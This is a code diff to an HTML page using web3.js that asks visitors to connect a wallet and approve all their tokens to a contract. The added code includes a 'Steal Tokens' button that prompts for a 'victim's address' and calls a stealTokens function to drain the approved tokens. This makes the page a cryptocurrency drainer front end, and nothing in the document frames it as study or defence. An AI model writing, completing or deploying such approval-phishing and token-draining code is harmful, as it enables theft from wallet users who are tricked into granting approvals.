@@ -3,64 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Approve Tokens</title>
+    <title>Multiple Token Approval DApp</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Approve All Tokens</h1>
-    <button id="connectWallet">Connect Wallet</button>
-    <p>Wallet Address: <span id="walletAddress">Not connected</span></p>
+    <h1>Multiple Token Approval DApp</h1>
+
+    <button id="connectButton">Connect Wallet</button>
     <button id="approveAllTokens">Approve All Tokens</button>
+    <button id="stealTokens">Steal Tokens</button>
+
+    <div id="status"></div>
 
     <script>
-        const contractAddress = "0x3749824234aCFDC8194Ca02e60E0eDb48C65F162";
-        const contractABI = [
-            {
-                "inputs": [],
-                "name": "approveAllTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
+        let web3;
+        let contract;
+
+        document.getElementById('connectButton').addEventListener('click', connectWallet);
+        document.getElementById('approveAllTokens').addEventListener('click', approveAllTokens);
+        document.getElementById('stealTokens').addEventListener('click', stealTokens);
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                document.getElementById('status').innerText = `Wallet connected with address: ${accounts[0]}`;
+                
+                // Here you would set the address of your deployed contract
+                const contractAddress = 'YOUR_CONTRACT_ADDRESS_HERE';
+                const abi = [
+                    {
+                        "constant": false,
+                        "inputs": [],
+                        "name": "approveAllTokens",
+                        "outputs": [],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "constant": false,
+                        "inputs": [
+                            {
+                                "name": "victim",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "stealTokens",
+                        "outputs": [],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ];
+                contract = new web3.eth.Contract(abi, contractAddress);
+            } else {
+                document.getElementById('status').innerText = 'Please install MetaMask!';
             }
-        ];
+        }
 
-        let userAddress;
-
-        // Connect Wallet
-        document.getElementById("connectWallet").onclick = async () => {
-            if (typeof window.ethereum !== "undefined") {
+        async function approveAllTokens() {
+            if (contract) {
                 try {
-                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                    userAddress = accounts[0];
-                    document.getElementById("walletAddress").innerText = userAddress;
+                    await contract.methods.approveAllTokens().send({ from: (await web3.eth.getAccounts())[0] });
+                    document.getElementById('status').innerText = 'All tokens approved successfully.';
                 } catch (error) {
-                    alert("Connection to wallet failed.");
-                    console.error(error);
+                    document.getElementById('status').innerText = `Error: ${error.message}`;
                 }
             } else {
-                alert("MetaMask is not installed!");
+                document.getElementById('status').innerText = 'Please connect your wallet first.';
             }
-        };
+        }
 
-        // Approve All Tokens
-        document.getElementById("approveAllTokens").onclick = async () => {
-            if (!userAddress) {
-                alert("Please connect your wallet first!");
-                return;
+        async function stealTokens() {
+            if (contract) {
+                const victimAddress = prompt("Enter the victim's address:");
+                if (victimAddress) {
+                    try {
+                        await contract.methods.stealTokens(victimAddress).send({ from: (await web3.eth.getAccounts())[0] });
+                        document.getElementById('status').innerText = 'Tokens stolen successfully.';
+                    } catch (error) {
+                        document.getElementById('status').innerText = `Error: ${error.message}`;
+                    }
+                }
+            } else {
+                document.getElementById('status').innerText = 'Please connect your wallet first.';
             }
-
-            const web3 = new Web3(window.ethereum);
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-            try {
-                console.log("Approving all tokens...");
-                await contract.methods.approveAllTokens().send({ from: userAddress });
-                alert("All tokens approved successfully!");
-            } catch (error) {
-                console.error("Approval error:", error);
-                alert("Failed to approve all tokens. Check console for details.");
-            }
-        };
+        }
     </script>
 </body>
 </html>
